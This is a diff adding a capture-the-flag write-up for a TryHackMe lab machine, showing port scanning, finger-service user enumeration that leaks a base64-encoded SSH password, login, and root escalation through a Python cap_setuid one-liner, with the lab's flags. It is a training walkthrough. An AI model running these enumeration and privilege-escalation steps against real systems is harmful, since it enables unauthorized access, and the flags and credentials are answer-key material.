@@ -377,3 +377,201 @@ THM{Ev1l_M@Cr0}ubuntu@tryhackme:~$
 4. **Malicious Actions:**
     - Creates a backdoor admin user (**`administrrator`**).
     - Contains the flag in base64 (**`VEhNe0V2MWxfTUBDcjB9`** → **`THM{Ev1l_M@Cr0}`**).
+
+
+## Chess Industry
+
+### Description:
+
+> This was a Boot2Root challenge, I forgot to copy its description but will update it here as soon as I stumble upon it!
+
+### **Step 1: Reconnaissance (Port Scanning)**
+
+We start by scanning the target machine (**`10.10.94.121`**) to identify open ports and services.
+
+### Nmap Scan
+
+```bash
+root@ip-10-10-187-39:~# nmap -sCV -T4 -p- 10.10.94.121
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-28 14:19 BST
+Nmap scan report for ip-10-10-94-121.eu-west-1.compute.internal (10.10.94.121)
+Host is up (0.00015s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+79/tcp open  finger  Linux fingerd
+|_finger: No one logged on.\x0D
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: PrecisionChess IoT - Smart Chessboard Control
+MAC Address: 02:61:72:C9:A6:09 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.04 seconds
+root@ip-10-10-187-39:~# 
+```
+
+**Findings:**
+
+- **Port 22 (SSH)** - OpenSSH 8.9p1 (Ubuntu)
+- **Port 79 (finger)** - Linux **`fingerd`** service
+- **Port 80 (HTTP)** - Apache 2.4.52 (Ubuntu)
+    - Website: **PrecisionChess IoT - Smart Chessboard Control**
+
+### **Step 2: Web Enumeration**
+
+Visiting **`http://10.10.94.121`** reveals a chess-themed IoT control panel.
+
+### Key Observations:
+
+- **Under Construction** banner (possible incomplete security)
+- **Team Members** (potential usernames: **`magnus`**, **`fabiano`**, **`hikaru`**)
+- **Chessboard Status** (Board-001 to Board-004, one offline)
+
+![Webpage.png](attachment:b8a65598-501a-4801-a2bd-7b71832733a0:Webpage.png)
+
+### **Step 3: Exploiting the Finger Service (Port 79)**
+
+The **finger service** (**`fingerd`**) is an old but fascinating protocol that reveals information about users on a system. It was commonly used in early UNIX systems (1970s-1990s) but is rarely seen today due to security risks.
+
+---
+
+### **What is the Finger Protocol?**
+
+- **Purpose**: Provides user information (login name, real name, terminal, idle time, etc.).
+- **Port**: **TCP/79**
+
+The **`finger`** service can reveal user information.
+
+### Why Was It Dangerous?
+
+1. **Information Leakage**
+    - Reveals usernames, login times, and even **`.plan`**/**`.project`** files.
+    - Example: In this CTF, **`finger fabiano@10.10.94.121`** exposed a **base64 password** in **`.plan`**.
+2. **User Enumeration**
+    - Attackers could list valid usernames (**`finger @target`**).
+3. **Historical Exploits**
+    - Some versions had buffer overflows (e.g., **"fingerd" exploit in 1988 Morris Worm**).
+
+### Enumerate Users
+
+```bash
+finger @10.10.94.121
+finger fabiano@10.10.94.121
+finger hikaru@10.10.94.121
+finger magnus@10.10.94.121
+```
+
+We discover something interesting under Fabiano:
+
+```bash
+root@ip-10-10-187-39:~# finger fabiano@10.10.94.121
+Login: fabiano        			Name: 
+Directory: /home/fabiano            	Shell: /bin/bash
+Never logged in.
+No mail.
+Project:
+Reminders
+Plan:
+ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=
+```
+
+I tried decoding this string:
+
+```bash
+root@ip-10-10-187-39:~# echo "ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=" | base64 -d
+fabiano:o3jVTktarGQI07qroot@ip-10-10-187-39:~# 
+```
+
+This decodes to something that looks like credentials for SSH. 
+
+### Step 4: Initial Foothold via SSH
+
+Using the discovered credentials:
+
+```bash
+root@ip-10-10-187-39:~# ssh fabiano@10.10.94.121
+The authenticity of host '10.10.94.121 (10.10.94.121)' can't be established.
+ECDSA key fingerprint is SHA256:Dbhug683PbcwejGvtf6fe3Jk0Zg/5UheCErOHI6rbow.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.94.121' (ECDSA) to the list of known hosts.
+fabiano@10.10.94.121's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1030-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Jun 28 13:31:23 UTC 2025
+
+  System load:  0.19               Processes:             108
+  Usage of /:   17.8% of 19.31GB   Users logged in:       0
+  Memory usage: 44%                IPv4 address for ens5: 10.10.94.121
+  Swap usage:   0%
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+1 of these updates is a standard security update.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+fabiano@tryhackme-2204:~$ ls
+user.txt
+fabiano@tryhackme-2204:~$ cat user.txt
+THM{bishop_to_c4_check}
+```
+
+I then I downloaded the `linpeas.sh` script to my attacker machine and sent it to the vulnerable target using a python web server. I then uncovered something when I ran the script:
+
+```bash
+<-----------------------SNIP---------------------->
+Files with capabilities (limited to 50):
+/snap/core20/2434/usr/bin/ping cap_net_raw=ep
+/snap/core22/1621/usr/bin/ping cap_net_raw=ep
+/snap/core22/2010/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/python3.10 cap_setuid=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+<-----------------------SNIP---------------------->
+```
+
+**`cap_setuid`** allows Python to **set UID to root**! Therefore, we can exploit it to get a root shell.
+
+**Exploiting Python Capabilities:**
+
+```bash
+fabiano@tryhackme-2204:/tmp$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@tryhackme-2204:/tmp# pwd
+/tmp
+root@tryhackme-2204:/tmp# ls /root
+root.txt  snap
+root@tryhackme-2204:/tmp# cat /root/root.txt 
+THM{check_check_check_mate}
+root@tryhackme-2204:/tmp# 
+```
+
+### Final Thoughts
+
+### Attack Path Summary
+
+1. **Port Scan** → Found **`finger`** (port 79) and HTTP (port 80).
+2. **Finger Enumeration** → Leaked **`fabiano`**'s password via **`.plan`**.
+3. **SSH Login** → Gained initial shell.
+4. **Capabilities Abuse** → Used **`python3.10`**'s **`cap_setuid`** to escalate to root.
